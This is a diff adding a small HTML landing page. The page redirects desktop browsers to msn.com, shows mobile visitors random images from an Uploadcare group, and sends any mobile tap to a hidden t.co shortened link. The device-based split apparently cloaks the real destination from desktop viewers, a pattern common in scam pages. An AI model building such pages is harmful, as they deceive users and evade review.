@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Scrollable Landing Page</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .image-container {
+      height: 100vh;
+      width: 100vw;
+      overflow-y: scroll;
+      scroll-snap-type: y mandatory;
+      -webkit-overflow-scrolling: touch;
+      cursor: pointer;
+    }
+
+    .full-image-section {
+      height: 100vh;
+      width: 100vw;
+      scroll-snap-align: start;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      position: relative;
+      transition: background-image 0.5s ease-in-out;
+    }
+  </style>
+
+  <script>
+    // Redirect desktop users immediately
+    const desktopURL = "https://www.msn.com/it-it";
+    const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\\s*ce|palm/i.test(navigator.userAgent.toLowerCase());
+    if (!isMobile) window.location.replace(desktopURL);
+  </script>
+</head>
+<body>
+  <div class="image-container" id="imageContainer"></div>
+
+  <script>
+    const mobileURL = "https://t.co/21Bu3LDwwY";
+    const imageContainer = document.getElementById("imageContainer");
+
+    // Redirect mobile users when clicking anywhere
+    imageContainer.addEventListener("click", () => {
+      window.location.href = mobileURL;
+    });
+
+    // Uploadcare configuration
+    const publicKey = "7ac3ef25ab4fbe49b85a"; // ✅ your Uploadcare public key
+    const fileGroup = "YOUR_UPLOADCARE_FILE_GROUP"; //⚠️ replace with your actual group ID
+
+    async function loadImages() {
+      try {
+        const res = await fetch(`https://api.uploadcare.com/groups/${fileGroup}/`, {
+          headers: {
+            "Authorization": `Uploadcare.Simple ${publicKey}:`,
+            "Accept": "application/vnd.uploadcare-v0.5+json"
+          }
+        });
+
+        const data = await res.json();
+        const images = data.files;
+
+        if (!images || images.length === 0) {
+          console.error("No images found in Uploadcare group.");
+          return;
+        }
+
+        // Shuffle and take 10 random images
+        const selected = images.sort(() => 0.5 - Math.random()).slice(0, 10);
+
+        // Create scrollable sections
+        selected.forEach(img => {
+          const section = document.createElement("div");
+          section.className = "full-image-section";
+          section.style.backgroundImage = `url('https://ucarecdn.com/${img.uuid}/-/preview/')`;
+          imageContainer.appendChild(section);
+        });
+      } catch (err) {
+        console.error("Error loading Uploadcare group:", err);
+      }
+    }
+
+    loadImages();
+  </script>
+</body>
+</html>
